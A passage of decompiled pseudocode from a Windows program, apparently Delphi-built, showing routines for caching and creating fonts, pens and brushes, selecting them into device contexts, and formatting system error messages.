      FUN_00415fa8((int)local_1c);
      iVar2 = iVar2 + -1;
      uVar4 = iVar2 == 0;
    } while (!(bool)uVar4);
  }
  uVar4 = *(int *)(param_2 + 4) == 0;
  if ((bool)uVar4) {
    FUN_00415fa8((int)local_3c);
    FUN_00415fa8((int)local_44);
  }
  while( true ) {
    FUN_00404cc8((int)local_54,1,3,(int *)&local_64);
    FUN_00404bb4(local_64,(uint *)&LAB_004186f4);
    if ((bool)uVar4) break;
    iVar2 = FUN_00404a68((int)local_54);
    uVar4 = iVar2 == 3;
    if (iVar2 < 4) break;
    FUN_00404d08((int *)&local_54,1,1);
  }
  FUN_00404d08((int *)&local_54,1,3);
  FUN_004157ac(local_54,param_4);
  FUN_00415fa8((int)local_4c);
  *in_FS_OFFSET = pcVar5;
  FUN_004047cc((int *)&local_64,6);
  FUN_0040521c(local_4c,"\x0e\x06TFGInt\b",8);
  FUN_004047a8(&local_8);
  return;
}



void FUN_00418730(char *param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack32;
  undefined *puStack28;
  undefined *puStack24;
  char local_d;
  undefined local_c [8];
  
  puStack24 = (undefined *)0x418747;
  FUN_00405100((int)local_c,(int)&DAT_00415450);
  puStack28 = &LAB_004187be;
  uStack32 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack32;
  if ((*(uint *)(*(int *)(param_1 + 4) + 4) & 1) == 0) {
    *(int *)(*(int *)(param_1 + 4) + 4) = *(int *)(*(int *)(param_1 + 4) + 4) + 1;
  }
  puStack24 = &stack0xfffffffc;
  FUN_00415c1c(&LAB_004187d4,local_c);
  local_d = '\0';
  while (local_d == '\0') {
    FUN_004165f8((int)param_1,(int)local_c);
    FUN_00418030(param_1,4,&local_d);
  }
  FUN_00415fa8((int)local_c);
  *in_FS_OFFSET = uStack32;
  puStack24 = &LAB_004187c5;
  puStack28 = (undefined *)0x4187bd;
  FUN_004051d0((int)local_c,(int)&DAT_00415450);
  return;
}



void FUN_004197c0(HGDIOBJ param_1)

{
  if ((param_1 != (HGDIOBJ)0x0) && (param_1 != DAT_00442890)) {
    DeleteObject(param_1);
  }
  return;
}



ushort FUN_00419834(byte *param_1,int param_2)

{
  ushort uVar1;
  
  uVar1 = 0;
  do {
    uVar1 = uVar1 << 5 & 0xff00 |
            (ushort)(byte)(((byte)(uVar1 << 5) | (byte)(uVar1 >> 0xb)) ^ *param_1);
    param_1 = param_1 + 1;
    param_2 = param_2 + -1;
  } while (param_2 != 0);
  return uVar1;
}



int * FUN_00419848(int *param_1,char param_2,undefined4 param_3)

{
  undefined4 extraout_ECX;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  undefined4 in_stack_fffffff4;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffe8,in_stack_ffffffec,
                                  in_stack_fffffff0,in_stack_fffffff4);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  *(short *)(param_1 + 8) = (short)param_3;
  InitializeCriticalSection((LPCRITICAL_SECTION)(param_1 + 2));
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_ffffffe8;
  }
  return param_1;
}



void FUN_004198a8(int param_1)

{
  EnterCriticalSection((LPCRITICAL_SECTION)(param_1 + 8));
  return;
}



void FUN_004198b4(int param_1)

{
  LeaveCriticalSection((LPCRITICAL_SECTION)(param_1 + 8));
  return;
}



void FUN_004198c0(int param_1,int *param_2)

{
  ushort uVar1;
  undefined4 uVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack32;
  undefined *puStack28;
  undefined *puStack24;
  undefined4 *local_c;
  
  puStack24 = (undefined *)0x4198db;
  uVar1 = FUN_00419834((byte *)param_2,(uint)*(ushort *)(param_1 + 0x20));
  puStack24 = (undefined *)0x4198e5;
  FUN_004198a8(param_1);
  puStack28 = &LAB_00419994;
  uStack32 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack32;
  puStack24 = &stack0xfffffffc;
  for (local_c = *(undefined4 **)(param_1 + 4); local_c != (undefined4 *)0x0;
      local_c = (undefined4 *)*local_c) {
    if (uVar1 == *(ushort *)(local_c + 3)) {
      uVar2 = FUN_00407e4c(local_c + 4,param_2,(uint)*(ushort *)(param_1 + 0x20));
      if ((char)uVar2 != '\0') break;
    }
  }
  if (local_c == (undefined4 *)0x0) {
    local_c = (undefined4 *)FUN_004026a8(*(ushort *)(param_1 + 0x20) + 0x10);
    *local_c = *(undefined4 *)(param_1 + 4);
    local_c[1] = 0;
    local_c[2] = *param_2;
    *(ushort *)(local_c + 3) = uVar1;
    FUN_0040285c(param_2,local_c + 4,(uint)*(ushort *)(param_1 + 0x20));
    *(undefined4 **)(param_1 + 4) = local_c;
  }
  local_c[1] = local_c[1] + 1;
  *in_FS_OFFSET = uStack32;
  puStack24 = &LAB_0041999b;
  puStack28 = (undefined *)0x419993;
  FUN_004198b4(param_1);
  return;
}



void FUN_004199a4(int param_1,undefined4 *param_2)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack32;
  undefined4 uStack28;
  undefined *puStack24;
  undefined4 *local_14;
  undefined local_d;
  undefined4 *local_c;
  int local_8;
  
  if (param_2 == (undefined4 *)0x0) {
    return;
  }
  puStack24 = (undefined *)0x4199c8;
  local_14 = param_2;
  local_c = param_2;
  local_8 = param_1;
  FUN_004198a8(param_1);
  uStack32 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack32;
  local_14[1] = local_14[1] + -1;
  local_d = local_14[1] == 0;
  if ((bool)local_d) {
    puVar1 = *(undefined4 **)(local_8 + 4);
    if (*(undefined4 **)(local_8 + 4) == local_c) {
      *(undefined4 *)(local_8 + 4) = *local_c;
    }
    else {
      do {
        puVar2 = puVar1;
        puVar1 = (undefined4 *)*puVar2;
      } while (puVar1 != local_c);
      *puVar2 = *local_c;
    }
  }
  *in_FS_OFFSET = uStack32;
  puStack24 = &DAT_00419a32;
  uStack28 = 0x419a2a;
  FUN_004198b4(local_8);
  return;
}



void FUN_00419a54(int param_1,int *param_2,int *param_3)

{
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack36;
  undefined *puStack32;
  undefined *puStack28;
  
  puStack28 = (undefined *)0x419a6d;
  FUN_004198a8(param_1);
  puStack32 = &DAT_00419abd;
  uStack36 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack36;
  puVar1 = (undefined4 *)param_2[4];
  puStack28 = &stack0xfffffffc;
  puVar2 = (undefined4 *)FUN_004198c0(param_1,param_3);
  param_2[4] = (int)puVar2;
  if (puVar1 != puVar2) {
    FUN_00403d20(param_2,extraout_EDX,extraout_ECX);
  }
  FUN_004199a4(param_1,puVar1);
  *in_FS_OFFSET = uStack36;
  puStack28 = &LAB_00419ac4;
  puStack32 = (undefined *)0x419abc;
  FUN_004198b4(param_1);
  return;
}



void FUN_00419acc(int param_1,int *param_2,undefined4 *param_3)

{
  undefined4 *puVar1;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack32;
  undefined *puStack28;
  undefined *puStack24;
  
  puStack24 = (undefined *)0x419ae2;
  FUN_004198a8(param_1);
  puStack28 = &LAB_00419b28;
  uStack32 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack32;
  puVar1 = (undefined4 *)param_2[4];
  if (param_3 != puVar1) {
    param_3[1] = param_3[1] + 1;
    param_2[4] = (int)param_3;
    puStack24 = &stack0xfffffffc;
    FUN_00403d20(param_2,extraout_EDX,extraout_ECX);
    FUN_004199a4(param_1,puVar1);
  }
  *in_FS_OFFSET = uStack32;
  puStack24 = &LAB_00419b2f;
  puStack28 = (undefined *)0x419b27;
  FUN_004198b4(param_1);
  return;
}



void FUN_00419f78(uint param_1)

{
  if ((int)param_1 < 0) {
    GetSysColor(param_1 & 0xff);
  }
  return;
}



void FUN_00419fbc(int param_1)

{
  if (*(LPCRITICAL_SECTION *)(param_1 + 0x14) != (LPCRITICAL_SECTION)0x0) {
    EnterCriticalSection(*(LPCRITICAL_SECTION *)(param_1 + 0x14));
  }
  return;
}



void FUN_00419fcc(int param_1)

{
  if (*(LPCRITICAL_SECTION *)(param_1 + 0x14) != (LPCRITICAL_SECTION)0x0) {
    LeaveCriticalSection(*(LPCRITICAL_SECTION *)(param_1 + 0x14));
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int * FUN_0041a1b0(int *param_1,char param_2,undefined4 param_3)

{
  int iVar1;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  undefined4 in_stack_fffffff4;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffe8,in_stack_ffffffec,
                                  in_stack_fffffff0,in_stack_fffffff4);
    param_2 = extraout_DL;
  }
  _DAT_00440734 = 0;
  iVar1 = FUN_004198c0(DAT_004428dc,(int *)&DAT_00440734);
  param_1[4] = iVar1;
  param_1[6] = -0xfffff8;
  param_1[7] = DAT_00442898;
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_ffffffe8;
  }
  return param_1;
}



void FUN_0041a31c(int param_1,undefined4 *param_2)

{
  int iVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  
  puVar2 = (undefined4 *)(*(int *)(param_1 + 0x10) + 0x10);
  puVar3 = param_2;
  for (iVar1 = 0xb; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  *param_2 = 0;
  return;
}



void FUN_0041a334(int *param_1,int *param_2)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStack24;
  undefined *puStack20;
  undefined *puStack16;
  
  puStack16 = (undefined *)0x41a346;
  FUN_00419fbc((int)param_1);
  puStack20 = &DAT_0041a379;
  uStack24 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack24;
  puStack16 = &stack0xfffffffc;
  FUN_00419a54(DAT_004428dc,param_1,param_2);
  *in_FS_OFFSET = uStack24;
  puStack16 = &LAB_0041a380;
  puStack20 = (undefined *)0x41a378;
  FUN_00419fcc((int)param_1);
  return;
}



void FUN_0041a398(int param_1)

{
  int iVar1;
  uint uVar2;
  HFONT pHVar3;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack108;
  undefined *puStack104;
  undefined *puStack100;
  undefined4 uStack96;
  undefined *puStack92;
  undefined *puStack88;
  undefined *local_50;
  undefined *local_4c;
  undefined *local_48;
  undefined local_44 [60];
  int local_8;
  
  puStack88 = &stack0xfffffffc;
  local_50 = (undefined *)0x0;
  local_4c = (undefined *)0x0;
  local_48 = (undefined *)0x0;
  puStack92 = &LAB_0041a521;
  uStack96 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack96;
  local_8 = *(int *)(param_1 + 0x10);
  if (*(int *)(local_8 + 8) == 0) {
    puStack100 = (undefined *)0x41a3d7;
    FUN_004198a8(DAT_004428dc);
    puStack104 = &LAB_0041a4f9;
    uStack108 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStack108;
    if (*(int *)(local_8 + 8) == 0) {
      local_44._0_4_ = *(LONG *)(local_8 + 0x14);
      local_44._4_4_ = 0;
      local_44._8_4_ = 0;
      local_44._12_4_ = 0;
      if ((*(byte *)(local_8 + 0x19) & 1) == 0) {
        local_44._16_4_ = 400;
      }
      else {
        local_44._16_4_ = 700;
      }
      local_44[20] = (*(byte *)(local_8 + 0x19) & 2) != 0;
      local_44[21] = (*(byte *)(local_8 + 0x19) & 4) != 0;
      local_44[22] = (*(byte *)(local_8 + 0x19) & 8) != 0;
      local_44[23] = *(BYTE *)(local_8 + 0x1a);
      puStack100 = &stack0xfffffffc;
      FUN_00404a0c((int *)&local_48,(byte *)(local_8 + 0x1b));
      iVar1 = FUN_00407f50(local_48,"Default");
      if (iVar1 == 0) {
        FUN_00404a0c((int *)&local_4c,(byte *)s__MS_Sans_Serif_0044073f);
        FUN_00408a18((undefined4 *)(local_44 + 0x1c),local_4c);
      }
      else {
        FUN_00404a0c((int *)&local_50,(byte *)(local_8 + 0x1b));
        FUN_00408a18((undefined4 *)(local_44 + 0x1c),local_50);
      }
      local_44[26] = '\0';
      local_44[24] = '\0';
      local_44[25] = '\0';
      uVar2 = FUN_0041a658(param_1);
      if ((char)uVar2 == '\x01') {
        local_44[27] = '\x02';
      }
      else if ((char)uVar2 == '\x02') {
        local_44[27] = '\x01';
      }
      else {
        local_44[27] = '\0';
      }
      pHVar3 = CreateFontIndirectA((LOGFONTA *)local_44);
      *(HFONT *)(local_8 + 8) = pHVar3;
    }
    *in_FS_OFFSET = uStack108;
    puStack100 = (undefined *)0x41a500;
    puStack104 = (undefined *)0x41a4f8;
    FUN_004198b4(DAT_004428dc);
    return;
  }
  *in_FS_OFFSET = uStack96;
  puStack88 = &LAB_0041a528;
  puStack92 = (undefined *)0x41a520;
  FUN_004047cc((int *)&local_50,3);
  return;
}



uint FUN_0041a658(int param_1)

{
  return *(uint *)(param_1 + 0x10) & 0xffffff00 | (uint)*(byte *)(*(uint *)(param_1 + 0x10) + 0x18);
}



int * FUN_0041a6b8(int *param_1,char param_2,undefined4 param_3)

{
  int iVar1;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  undefined4 in_stack_fffffff4;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffe8,in_stack_ffffffec,
                                  in_stack_fffffff0,in_stack_fffffff4);
    param_2 = extraout_DL;
  }
  iVar1 = FUN_004198c0(DAT_004428e0,(int *)&DAT_00440994);
  param_1[4] = iVar1;
  *(undefined *)(param_1 + 6) = 4;
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_ffffffe8;
  }
  return param_1;
}



undefined4 FUN_0041a874(int param_1)

{
  HPEN pHVar1;
  undefined4 uVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack36;
  undefined *puStack32;
  undefined *puStack28;
  LOGPEN local_18;
  int local_8;
  
  local_8 = *(int *)(param_1 + 0x10);
  if (*(int *)(local_8 + 8) == 0) {
    puStack28 = (undefined *)0x41a893;
    FUN_004198a8(DAT_004428e0);
    puStack32 = &LAB_0041a8fa;
    uStack36 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStack36;
    if (*(int *)(local_8 + 8) == 0) {
      local_18.lopnStyle = (UINT)*(ushort *)(&DAT_004409a4 + (uint)*(byte *)(local_8 + 0x1c) * 2);
      local_18.lopnWidth.x = *(LONG *)(local_8 + 0x18);
      puStack28 = &stack0xfffffffc;
      local_18.lopnColor = FUN_00419f78(*(uint *)(local_8 + 0x14));
      pHVar1 = CreatePenIndirect(&local_18);
      *(HPEN *)(local_8 + 8) = pHVar1;
    }
    *in_FS_OFFSET = uStack36;
    puStack28 = (undefined *)0x41a901;
    puStack32 = (undefined *)0x41a8f9;
    uVar2 = FUN_004198b4(DAT_004428e0);
    return uVar2;
  }
  return *(undefined4 *)(local_8 + 8);
}



int * FUN_0041a984(int *param_1,char param_2,undefined4 param_3)

{
  int iVar1;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  undefined4 in_stack_fffffff4;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffe8,in_stack_ffffffec,
                                  in_stack_fffffff0,in_stack_fffffff4);
    param_2 = extraout_DL;
  }
  iVar1 = FUN_004198c0(DAT_004428e4,(int *)&DAT_004409b4);
  param_1[4] = iVar1;
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_ffffffe8;
  }
  return param_1;
}



undefined4 FUN_0041ab00(int param_1)

{
  return *(undefined4 *)(*(int *)(param_1 + 0x10) + 0x14);
}



undefined4 FUN_0041ab3c(int param_1)

{
  byte bVar1;
  int *piVar2;
  HBRUSH pHVar3;
  undefined4 uVar4;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack32;
  undefined *puStack28;
  undefined *puStack24;
  LOGBRUSH local_14;
  int local_8;
  
  local_8 = *(int *)(param_1 + 0x10);
  if (*(int *)(local_8 + 8) == 0) {
    puStack24 = (undefined *)0x41ab5f;
    FUN_004198a8(DAT_004428e4);
    puStack28 = &LAB_0041ac09;
    uStack32 = *in_FS_OFFSET;
    *in_FS_OFFSET = &uStack32;
    if (*(int *)(local_8 + 8) == 0) {
      piVar2 = *(int **)(local_8 + 0x18);
      if (piVar2 == (int *)0x0) {
        local_14.lbHatch = 0;
        bVar1 = *(byte *)(local_8 + 0x1c);
        if (bVar1 == 0) {
          local_14.lbStyle = 0;
          puStack24 = &stack0xfffffffc;
        }
        else if (bVar1 == 1) {
          local_14.lbStyle = 1;
          puStack24 = &stack0xfffffffc;
        }
        else {
          local_14.lbStyle = 2;
          local_14.lbHatch = (bVar1 & 0x7f) - 2;
          puStack24 = &stack0xfffffffc;
        }
      }
      else {
        local_14.lbStyle = 3;
        puStack24 = &stack0xfffffffc;
        (**(code **)(*piVar2 + 0x6c))(piVar2,1);
        local_14.lbHatch = (**(code **)(**(int **)(local_8 + 0x18) + 100))();
      }
      local_14.lbColor = FUN_00419f78(*(uint *)(local_8 + 0x14));
      pHVar3 = CreateBrushIndirect(&local_14);
      *(HBRUSH *)(local_8 + 8) = pHVar3;
    }
    *in_FS_OFFSET = uStack32;
    puStack24 = (undefined *)0x41ac10;
    puStack28 = (undefined *)0x41ac08;
    uVar4 = FUN_004198b4(DAT_004428e4);
    return uVar4;
  }
  return *(undefined4 *)(local_8 + 8);
}



uint FUN_0041ac1c(int param_1)

{
  return *(uint *)(param_1 + 0x10) & 0xffffff00 | (uint)*(byte *)(*(uint *)(param_1 + 0x10) + 0x1c);
}



int * FUN_0041ac58(int *param_1,char param_2,undefined4 param_3)

{
  int *piVar1;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  char extraout_DL;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_ffffffe4;
  undefined4 in_stack_ffffffe8;
  undefined4 in_stack_ffffffec;
  undefined4 in_stack_fffffff0;
  
  if (param_2 != '\0') {
    param_1 = (int *)FUN_00403da0((int)param_1,param_2,param_3,in_stack_ffffffe4,in_stack_ffffffe8,
                                  in_stack_ffffffec,in_stack_fffffff0);
    param_3 = extraout_ECX;
    param_2 = extraout_DL;
  }
  FUN_00403af4(param_1,'\0',param_3);
  InitializeCriticalSection((LPCRITICAL_SECTION)(param_1 + 0xe));
  piVar1 = FUN_0041a1b0((int *)&LAB_00418d2c,'\x01',extraout_ECX_00);
  param_1[3] = (int)piVar1;
  piVar1[3] = (int)param_1;
  piVar1[2] = (int)&LAB_0041b16c;
  piVar1[5] = (int)(param_1 + 0xe);
  piVar1 = FUN_0041a6b8((int *)&PTR_LAB_00411ec5_3_00418ea8,'\x01',extraout_ECX_01);
  param_1[4] = (int)piVar1;
  piVar1[3] = (int)param_1;
  piVar1[2] = (int)&LAB_0041b18c;
  piVar1[5] = (int)(param_1 + 0xe);
  piVar1 = FUN_0041a984((int *)&PTR_LAB_00411ec5_3_00418fa8,'\x01',extraout_ECX_02);
  param_1[5] = (int)piVar1;
  piVar1[3] = (int)param_1;
  piVar1[2] = (int)&LAB_0041b1ac;
  piVar1[5] = (int)(param_1 + 0xe);
  param_1[8] = 0xcc0020;
  *(undefined *)(param_1 + 2) = 0;
  FUN_00411cc0(DAT_004428e8,(int)param_1);
  if (param_2 != '\0') {
    FUN_00403df8(param_1);
    *in_FS_OFFSET = in_stack_ffffffe4;
  }
  return param_1;
}



void FUN_0041ad1c(int *param_1,char param_2)

{
  int *piVar1;
  byte extraout_DL;
  
  piVar1 = FUN_00403e08(param_1,param_2);
  FUN_00411d5c(DAT_004428e8,(int)piVar1);
  FUN_0041afa4(piVar1,0);
  FUN_00403b24((int *)piVar1[3]);
  FUN_00403b24((int *)piVar1[4]);
  FUN_00403b24((int *)piVar1[5]);
  DeleteCriticalSection((LPCRITICAL_SECTION)(piVar1 + 0xe));
  FUN_00411db8(piVar1,extraout_DL & 0xfc);
  if ('\0' < (char)extraout_DL) {
    FUN_00403df0(piVar1);
  }
  return;
}



void FUN_0041ad78(int param_1)

{
  EnterCriticalSection((LPCRITICAL_SECTION)&DAT_004428c4);
  *(int *)(param_1 + 0x50) = *(int *)(param_1 + 0x50) + 1;
  LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_004428c4);
  EnterCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x38));
  return;
}



void FUN_0041ada0(int *param_1,int param_2,int param_3)

{
  FUN_0041aff8(param_1,1);
  MoveToEx((HDC)param_1[1],param_2,param_3,(LPPOINT)0x0);
  return;
}



void FUN_0041adcc(int *param_1,undefined4 param_2,int *param_3)

{
  if (param_3 != (int *)0x0) {
    (**(code **)(*param_1 + 0x10))();
    FUN_0041aff8(param_1,0xf);
    (**(code **)(*param_3 + 0x14))(param_3,param_1,param_2);
    (**(code **)(*param_1 + 0xc))();
  }
  return;
}



void FUN_0041ae08(int param_1)

{
  undefined4 *in_FS_OFFSET;
  undefined4 uStackY24;
  
  EnterCriticalSection((LPCRITICAL_SECTION)&DAT_004428c4);
  uStackY24 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStackY24;
  if (*(int *)(param_1 + 0x50) == 0) {
    FUN_0041ad78(param_1);
  }
  *in_FS_OFFSET = uStackY24;
  uStackY24 = 0x41ae53;
  LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_004428c4);
  return;
}



void FUN_0041ae64(int param_1)

{
  LeaveCriticalSection((LPCRITICAL_SECTION)(param_1 + 0x38));
  EnterCriticalSection((LPCRITICAL_SECTION)&DAT_004428c4);
  *(int *)(param_1 + 0x50) = *(int *)(param_1 + 0x50) + -1;
  LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_004428c4);
  return;
}



void FUN_0041aeb4(int *param_1,LPPOINT param_2)

{
  FUN_0041aff8(param_1,1);
  GetCurrentPositionEx((HDC)param_1[1],param_2);
  return;
}



void FUN_0041aed8(int *param_1,int *param_2)

{
  FUN_0041ada0(param_1,*param_2,param_2[1]);
  return;
}



void FUN_0041aef8(int *param_1,int param_2,int param_3)

{
  FUN_0041aff8(param_1,1);
  GetPixel((HDC)param_1[1],param_2,param_3);
  return;
}



int FUN_0041af24(int *param_1)

{
  (**(code **)(*param_1 + 0x10))();
  FUN_0041aff8(param_1,0xf);
  return param_1[1];
}



void FUN_0041af44(int param_1)

{
  if ((*(HDC *)(param_1 + 4) != (HDC)0x0) &&
     (*(byte *)(param_1 + 8) != (*(byte *)(param_1 + 8) & 0xf1))) {
    SelectObject(*(HDC *)(param_1 + 4),DAT_0044289c);
    SelectObject(*(HDC *)(param_1 + 4),DAT_004428a0);
    SelectObject(*(HDC *)(param_1 + 4),DAT_004428a4);
    *(byte *)(param_1 + 8) = *(byte *)(param_1 + 8) & 0xf1;
  }
  return;
}



void FUN_0041afa4(int *param_1,int param_2)

{
  tagPOINT local_10;
  
  if (param_2 != param_1[1]) {
    if (param_1[1] != 0) {
      FUN_0041af44((int)param_1);
      FUN_0041aeb4(param_1,&local_10);
      param_1[6] = local_10.x;
      param_1[7] = local_10.y;
      param_1[1] = 0;
      *(byte *)(param_1 + 2) = *(byte *)(param_1 + 2) & 0xfe;
    }
    if (param_2 != 0) {
      *(byte *)(param_1 + 2) = *(byte *)(param_1 + 2) | 1;
      param_1[1] = param_2;
      FUN_0041aed8(param_1,param_1 + 6);
    }
  }
  return;
}



void FUN_0041aff8(int *param_1,byte param_2)

{
  int *piVar1;
  byte bVar2;
  
  bVar2 = ~*(byte *)(param_1 + 2) & param_2;
  if (bVar2 != 0) {
    if ((bVar2 & 1) != 0) {
      (**(code **)(*param_1 + 0x14))();
      if (param_1[1] == 0) {
        piVar1 = FUN_0040b978((int *)&DAT_00410c48,'\x01',(int **)PTR_PTR_DAT_00441434);
        FUN_00404208((int)piVar1);
      }
    }
    if ((bVar2 & 2) != 0) {
      FUN_0041b094((int)param_1);
    }
    if ((bVar2 & 4) != 0) {
      FUN_0041b0c0((int)param_1);
    }
    if ((bVar2 & 8) != 0) {
      FUN_0041b0f0((int)param_1);
    }
    *(byte *)(param_1 + 2) = bVar2 | *(byte *)(param_1 + 2);
  }
  return;
}



void FUN_0041b094(int param_1)

{
  HGDIOBJ h;
  COLORREF color;
  
  h = (HGDIOBJ)FUN_0041a398(*(int *)(param_1 + 0xc));
  SelectObject(*(HDC *)(param_1 + 4),h);
  color = FUN_00419f78(*(uint *)(*(int *)(param_1 + 0xc) + 0x18));
  SetTextColor(*(HDC *)(param_1 + 4),color);
  return;
}



void FUN_0041b0c0(int param_1)

{
  HGDIOBJ h;
  
  h = (HGDIOBJ)FUN_0041a874(*(int *)(param_1 + 0x10));
  SelectObject(*(HDC *)(param_1 + 4),h);
  SetROP2(*(HDC *)(param_1 + 4),
          (uint)*(ushort *)(&DAT_004409c4 + (uint)*(byte *)(*(int *)(param_1 + 0x10) + 0x18) * 2));
  return;
}



void FUN_0041b0f0(int param_1)

{
  HGDIOBJ pvVar1;
  uint uVar2;
  COLORREF color;
  
  pvVar1 = (HGDIOBJ)FUN_0041ab3c(*(int *)(param_1 + 0x14));
  UnrealizeObject(pvVar1);
  pvVar1 = (HGDIOBJ)FUN_0041ab3c(*(int *)(param_1 + 0x14));
  SelectObject(*(HDC *)(param_1 + 4),pvVar1);
  uVar2 = FUN_0041ac1c(*(int *)(param_1 + 0x14));
  if ((char)uVar2 == '\0') {
    uVar2 = FUN_0041ab00(*(int *)(param_1 + 0x14));
    color = FUN_00419f78(uVar2);
    SetBkColor(*(HDC *)(param_1 + 4),color);
    SetBkMode(*(HDC *)(param_1 + 4),2);
    return;
  }
  uVar2 = FUN_0041ab00(*(int *)(param_1 + 0x14));
  uVar2 = FUN_00419f78(uVar2);
  SetBkColor(*(HDC *)(param_1 + 4),~uVar2);
  SetBkMode(*(HDC *)(param_1 + 4),1);
  return;
}



void FUN_0041b1cc(int **param_1)

{
  int *piVar1;
  
  piVar1 = FUN_0040b978((int *)&DAT_00418978,'\x01',param_1);
  FUN_00404208((int)piVar1);
  return;
}



void FUN_0041b1e4(int **param_1)

{
  int *piVar1;
  
  piVar1 = FUN_0040b978((int *)&DAT_0041891c,'\x01',param_1);
  FUN_00404208((int)piVar1);
  return;
}



void FUN_0041b1fc(void)

{
  FUN_0041b1e4((int **)PTR_PTR_DAT_00441418);
  return;
}



void FUN_0041b208(void)

{
  FUN_0041b1e4((int **)PTR_PTR_DAT_00441420);
  return;
}



void FUN_0041b214(void)

{
  FUN_0041b1e4((int **)PTR_PTR_DAT_00441514);
  return;
}



void FUN_0041b220(void)

{
  int *piVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack20;
  undefined *puStack16;
  undefined *puStack12;
  undefined4 *local_8;
  
  puStack12 = &stack0xfffffffc;
  local_8 = (undefined4 *)0x0;
  puStack16 = &LAB_0041b26a;
  uStack20 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack20;
  FUN_0040658c((int **)PTR_PTR_DAT_004413b8,(int *)&local_8);
  piVar1 = FUN_0040b8bc((int *)&DAT_00410bec,'\x01',local_8);
  FUN_00404208((int)piVar1);
  *in_FS_OFFSET = uStack20;
  puStack12 = &LAB_0041b271;
  puStack16 = (undefined *)0x41b269;
  FUN_004047a8((int *)&local_8);
  return;
}



void FUN_0041b274(void)

{
  DWORD DVar1;
  int *piVar2;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack280;
  undefined *puStack276;
  undefined *puStack272;
  undefined4 *local_108;
  undefined4 local_104 [64];
  
  puStack272 = &stack0xfffffffc;
  local_108 = (undefined4 *)0x0;
  puStack276 = &LAB_0041b310;
  uStack280 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack280;
  DVar1 = GetLastError();
  if (DVar1 != 0) {
    DVar1 = FormatMessageA(0x1000,(LPCVOID)0x0,DVar1,0x400,(LPSTR)local_104,0x100,(va_list *)0x0);
    if (DVar1 != 0) {
      FUN_00404a18((int *)&local_108,local_104,0x100);
      piVar2 = FUN_0040b8bc((int *)&DAT_00410bec,'\x01',local_108);
      FUN_00404208((int)piVar2);
      goto LAB_0041b2f7;
    }
  }
  FUN_0041b220();
LAB_0041b2f7:
  *in_FS_OFFSET = uStack280;
  puStack272 = &LAB_0041b317;
  puStack276 = (undefined *)0x41b30f;
  FUN_004047a8((int *)&local_108);
  return;
}



int FUN_0041b31c(int param_1)

{
  if (param_1 == 0) {
    FUN_0041b274();
  }
  return param_1;
}



void FUN_0041b32c(HANDLE param_1,int *param_2,char param_3)

{
  HGDIOBJ h;
  HGDIOBJ h_00;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar1;
  undefined4 uStack80;
  undefined local_38 [4];
  int local_34;
  int local_30;
  HDC local_20;
  HDC local_1c;
  HDC local_18;
  HBITMAP local_14;
  int local_10;
  int local_c;
  HANDLE local_8;
  
  local_10 = *param_2;
  local_c = param_2[1];
